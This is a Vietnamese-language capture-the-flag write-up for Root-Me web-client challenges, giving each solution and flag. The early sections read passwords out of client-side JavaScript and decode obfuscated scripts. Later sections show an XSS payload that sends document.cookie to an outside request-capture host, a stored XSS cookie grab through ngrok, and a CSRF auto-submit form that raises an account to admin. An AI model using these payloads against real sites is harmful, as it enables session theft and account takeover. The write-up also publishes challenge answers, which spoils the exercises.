## 1. HTML - buttons disabled
- Đề cho 2 cái input bị disabled thì vô source xóa nó đi là có thể điền vô được
![Screenshot 2022-05-11 121226](https://i.imgur.com/3Xg7VUD.png)

```py
Password: HTMLCantStopYou
```
## 2. Javascript - Authentication
- Đề cho trang login và có hướng dẫn xem file js thì vô source code tìm được đoạn này
```js
function Login(){
	var pseudo=document.login.pseudo.value;
	var username=pseudo.toLowerCase();
	var password=document.login.password.value;
	password=password.toLowerCase();
	if (pseudo=="4dm1n" && password=="sh.org") {
	    alert("Password accepté, vous pouvez valider le challenge avec ce mot de passe.\nYou an validate the challenge using this password.");
	} else { 
	    alert("Mauvais mot de passe / wrong password"); 
	}
}
```
```js
Password: sh.org
```

## 3. Javascript - Source
- Đọc đề thì vô source xem thì có đoạn js này
```js
<script type="text/javascript">
/* <![CDATA[ */
	    function login(){
		pass=prompt("Entrez le mot de passe / Enter password");
		if ( pass == "123456azerty" ) {
		    alert("Mot de passe accepté, vous pouvez valider le challenge avec ce mot de passe.\nYou can validate the challenge using this password.");  }
		else {
		    alert("Mauvais mot de passe / wrong password !");
		}
	    }
	/* ]]> */
	</script>
```
```js
Password: 123456azerty
```
## 4. Javascript - Authentication2
- Đọc đề rồi vô source có đoạn js này

```js
function connexion(){
    var username = prompt("Username :", "");
    var password = prompt("Password :", "");
    var TheLists = ["GOD:HIDDEN"];
    for (i = 0; i < TheLists.length; i++)
    {
        if (TheLists[i].indexOf(username) == 0)
        {
            var TheSplit = TheLists[i].split(":");
            var TheUsername = TheSplit[0];
            var ThePassword = TheSplit[1];
            if (username == TheUsername && password == ThePassword)
            {
                alert("Vous pouvez utiliser ce mot de passe pour valider ce challenge (en majuscules) / You can use this password to validate this challenge (uppercase)");
            }
        }
        else
        {
            alert("Nope, you're a naughty hacker.")
        }
    }
}
```
- Thuật toán là chia cái "GOD:HIDDEN" bỏ ":" thì sẽ thành username và password
```js
Password: HIDDEN
```
## 5. Javascript - Obfuscation 1
- Đọc đề vô source thì có đoạn js này
```js
<script type="text/javascript">
              /* <![CDATA[ */

              pass = '%63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64';
              h = window.prompt('Entrez le mot de passe / Enter password');
              if(h == unescape(pass)) {
                  alert('Password accepté, vous pouvez valider le challenge avec ce mot de passe.\nYou an validate the challenge using this pass.');
              } else {
                  alert('Mauvais mot de passe / wrong password');
              }

              /* ]]> */
          </script>
```

- Hàm unescape() dùng để decode url nhưng không còn được dùng nữa bật console xem
```js
var a= unescape("%63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64")
=> undefined
console.log(a)
=> cpasbiendurpassword
```
```js
Password: cpasbiendurpassword
```
## 6. Javascript - Obfuscation 2
- Đọc đề vô source code thì đọc được đoạn js này
```js
<script type="text/javascript">
	var pass = unescape("unescape%28%22String.fromCharCode%2528104%252C68%252C117%252C102%252C106%252C100%252C107%252C105%252C49%252C53%252C54%2529%22%29");
</script>
```
- Decode dần dần thôi
![Screenshot 2022-05-11 123043](https://i.imgur.com/TF2mroT.png)

```js
Password: hDufjdki156
```
## 7. Javascript - Native code
- Họ đưa đoạn native code thì decode được function này
```js
function anonymous( ) { a=prompt('Entrez le mot de passe');if(a=='toto123lol'){alert('bravo');}else{alert('fail...');} }
```
```js
Password: toto123lol
```
## 8. Javascript - Webpack
- Bài này đề hướng dẫn dò password trong webpack thì dò từng file.
```js
Password: BecauseSourceMapsAreGreatForDebuggingButNotForProduction
```
## 9. Javascript - Obfuscation 3
- Đọc source code thì tìm được đoạn js này
```js
<script type="text/javascript">
    function dechiffre(pass_enc){
        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
        var tab  = pass_enc.split(',');
                var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length;
                        k = j + (l) + (n=0);
                        n = tab2.length;
                        for(i = (o=0); i < (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i]));
                                if(i == 5)break;}
                        for(i = (o=0); i < (k = j = n); i++ ){
                        o = tab[i-l]; 
                                if(i > 5 && i < k-1)
                                        p += String.fromCharCode((o = tab2[i]));
                        }
        p += String.fromCharCode(tab2[17]);
        pass = p;return pass;
    }
    String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));
    
    h = window.prompt('Entrez le mot de passe / Enter password');
    alert( dechiffre(h) );
    
</script>
```

- Bài này lúc nào nó cũng alert ra chuỗi "FAUX PASSWORD HAHA" nên không cần để ý tới hàm kia
- Decode chuỗi đề bài cho và dùng String.fromCharCode là ra
![Screenshot 2022-05-11 130703](https://i.imgur.com/Lv8QFVQ.png)
```js
Password: 786OsErtk12
```

## 11. XSS - Stored 1
- Đầu tiên chương trình cho 2 input và nhìn đề bài bị XSS nên dùng luôn payload và bị dính.
```js
<script>alert(1);</script> 
```
- Chạy ngrok và localhost để đọc cookie.
![Screenshot 2022-05-12 213653](https://i.imgur.com/dRh5TYs.png)
![Screenshot 2022-05-12 213710](https://i.imgur.com/52YHQsj.png)
```js
Password: NkI9qe4cdLIO2P7MIsWS8ofD6
```
## 13. 	CSRF - 0 protection
- Đầu tiên đăng kí tài khoản admin/admin thì vô phần private thì vì mình là user nên không có quyền đọc.
- Có một form update profile để tăng quyền lên admin nhưng mình không có quyền thay đổi status.
- Chèn form submit vào phần comment để gửi cho admin đọc lừa admin ấn vô submit là lên quyền.
```js
<form id="form" action="http://challeng01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">                    
    <input type="text" name="username" value="admin">
    <input type="checkbox" value="on" name="status" checked>
</form>
<script>
    document.getElementById("form").submit()
</script>
```
```js
Good job dude, flag is : Csrf_Fr33style-L3v3l1!
```
## 15. 	XSS DOM Based - Introduction
- Đầu tiên thấy cho 1 input đầu với number được code như sau.
```js
<script>
    var random = Math.random() * (99);
    var number = '100'; // input đầu vào
    if(random == number) {
        document.getElementById('state').style.color = 'green';
        document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
    }
    else{
        document.getElementById('state').style.color = 'red';
        document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
    }
    </script>
```
- XSS thử xem với 
```js
number = '; alert(1)//
- Thì bị dính XSS
```
- Vậy dùng requestbin tạo request bắt cookie là được.
```js
payload: 
http://challenge01.root-me.org/web-client/ch32/index.php?number=';document.location.href='https://eo4sv9ka4dlw5ll.m.pipedream.net/?flag='.concat(document.cookie);//
```
```js
flag: 
flag=rootme{XSS_D0M_BaSed_InTr0}

```


